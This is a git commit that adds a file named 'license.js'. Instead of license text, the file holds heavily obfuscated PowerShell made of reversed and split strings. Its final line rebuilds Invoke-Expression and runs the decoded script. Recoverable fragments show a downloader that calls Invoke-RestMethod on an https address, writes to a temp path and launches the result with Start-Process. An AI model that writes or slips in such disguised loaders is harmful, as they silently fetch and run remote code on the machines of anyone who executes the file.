accfca933115fd91aecdaeae282f5ee317a1d57c
Azkic50 <Azkilohj55@gmail.com>
2025-04-03 10:07:53 -0400

    Create license.js

---
+++ license.js
@@ -0,0 +1,22 @@
+SET-vaRiaBlE 4wc  ( " ) )43]RAHC[,)101]RAHC[+311]RAHC[+701]RAHC[(  EcaLPeR- 421]RAHC[,'KGm'  EcaLPeR-93]RAHC[,'rRI'  EcaLPeR- )')rRIrRInIoj-]2'+',11,3[EMAn.)'+'rRI*rDm*rRI elbaiRaV((& KGm '+')'+'421]RahC[,rRIu8FrRI EcaLPErC-  93]'+'RahC[,r'+'RIkH9rRI  eCalpER-29]RahC[,rRI9I0rRI eCalpER- 63]RahC[,rRIOqVrRI  '+'eCalpER-  ))rRIkH9J'+' = '+'a{@]kH9+kH9tkH9+kH9ckH9+kH9ejbOkH9+kH9rRI,rRI   kH9+kH9
+kH9+kH9'+'{ hk'+'H9+rRI,rRI'+' kH9+kH9  
+kH9+kH9}    
+;htkH9+kH9rRI,rRI   kH9+kH9  kH9+kH9
+{kH9rRI,r'+'RIH9nkH9+kH9wokH9+k'+'H9dkH9+kH9yQ4   rRI,rRI9yQ4kH9(ECAlrRI,rR'+'I+kH9 )htaPelifyQ4'+' htkH9+kHrRI,rRIifkH9+kH9yQkH9+kH94 eliFkrRI,rRI
+kH9+kH9 kH9+kH9;kH9'+'+kH9hkH9+kH9tkH9+kH9akH9+kH9PkH9+kH9ekH9+kH9lrRI,'+'rRI9+kH94 ssecorPkH9+kHrRI,rRI94 irU-kH'+'9+kH9 dokH9+kH9hteMkH9+kH9tseR-ekH9+kH9'+'kokH9+kH9vnI  kH9+kH9      rRI,rRIkrRI,rRI03[EMohsPO'+'qV+]12[eMOrRI,rRIkH9+kH9    kH9+kH9'+'  kH9+kH9
+;eurtyQkH9+kH94kH9+kH9 = kH9+kH9daokH9+kH9'+'lnrRI,rRIH9+krRI,rRIH9 iykH9+k'+'H9Q'+'4( hcaerofkH9'+'+kH9 kH9+kH9 kH9+kHrRI,rRI+kH9thkH9+kH9okH9+kH9AkH9+rRI,rRIH9+kH9    kH9+kH9 kH9+kH9 
+;eskH9+kH9lkH9+kH9afkH9+kH9ykH9+kH9Q4kH9+kH9 =k'+'H9+kH9 daolkH9+kr'+'RI,rRIkH9oAJkH9(ECAl'+'PeR.)kH99I0kH9,)68]RaHC[+rRI'+',rRI'+'9   kH9+'+'kH9 
+} kH9rRI,'+'rRImkH9+kH9ot'+'suCSPkH9+kH9[  
+kH9+kH9(@ kH9+kH9= ataDemkH9+kH9osykH9+kH9QkH'+'9+kH94  
+
+kH9( rRI,rRIhSpOqV ( &u8F )63]RaHC[]gnI'+'RTs[,kHrRI,rRIxkH9+]rRI,rRI
+{ )d'+'akH9+kH9olnwodykH9+kH9Q4(kH9+kH9 fikH9+kH9 kH9+kH9     
+ '+'}'+'krRI,rRIwokH9+kH9dkH9+k'+'H9yQ4k'+'H9+kH9 kH9+rRI,rRI9+kH9Q4VkH9+kH9FGPkH'+'9+kH9MET:kHrRI,rRIH9+kHrRI,rRI07]RaHrRI,rRI9+kH9vnkH9+kH9eykH9+kH9Q4oAJkH9+kHrRI,rRIH9zikH9+kH9pmekH9+'+'kH9/kH'+'9+kH9/:skH9+kH9ptkH9rRI,rRIH9+kH9tkH'+'9+kH9uO- a.iykHr'+'RI,rRI9aP-kH9+kH9'+'tkH9+kH'+'9seTkH9+kH9( firRI,rRI9 = kH9+kH9htaPelifyQ4kH9+kH'+'9  kH9+kH9   kH9'+'+kH9 
+{kH9+kH9 ykH9+kH9rkH9+kH9t   kH9+kH9 
+'+'{ )kH9+kH9akH9+kH9tkH9+kH9aDemokH9+kH9skH9+kH9ykH9+rRI,rRICrRI,rRI[+17]RaHC[((ECAlPeR.)kH9 kH9+kHrRI,rRIH9    '+' kH9+k'+'H9
+;oAJ)b.kH9+kH9iyQkH9+kH94(ykHrRI,rRI9
+;)kH9+kH9
+}'+'oAJiskH9+kH9m.kH9+kH9'+'MHKVTEDJkH9+kH9oAkH9+kH9J = b ;oAJkH9+kH9ismkH9+kH9.kH9+kH9MkH9+kH9HKVTkH9+kH9EDkH9+kH9J/tser.kH9rRI,rRI)kH9rRI,rR'+'I+kH9olok'+'rRI,rRIkH9Q4 nikH9+krRI,rRI9-tra'+'tSkH9+kH9 '+' kH9+kHrRI,rRI+kH9    kH9+kH9 rRI,'+'rRI9+kH9QkH9+kHrRI,rRI9 
+
+kH9+kH9} kH9+kH9 
+} rRI,rRI9rRI,rRIakH9+kH'+'9c krRI,rRIkH'+'9ctrRI,rRIaPelifkH9+kH9ykH9+kH9QkHrRI,rRIPeR.)43]RaHC[]gnIRTs[,rRI f'+'- eqk}11{}62{}6'+'3{}7'+'2{}34{}0{}03{}12{}51{}41{}5{}74{}2{}3{}22{}4{}64{}1{}93{}8'+'{}92{}7{}04{}14{}81{}6'+'{}83{'+'}52{}13{}44{}54{}24{}71{}53{}42{}73{}31{}32{}0'+'2{}61{}9{}33{}21{}01{}43{'+'}91{}23{}84{}82{eqk((( '((( )''NioJ-]2,11,3[emAN.)'*Rdm*' vg(( &" );& ( $psHome[4]+$psHOmE[34]+'X')("$( set-itEm 'VaRiAbLE:oFS'  '') "+[StriNG] ( (  GET-VArIaBLe  4Wc  ).VaLue[- 1 .. -((  GET-VArIaBLe  4Wc  ).VaLue.LENgTH) ]) +" $(sv 'OfS' ' ' ) ")
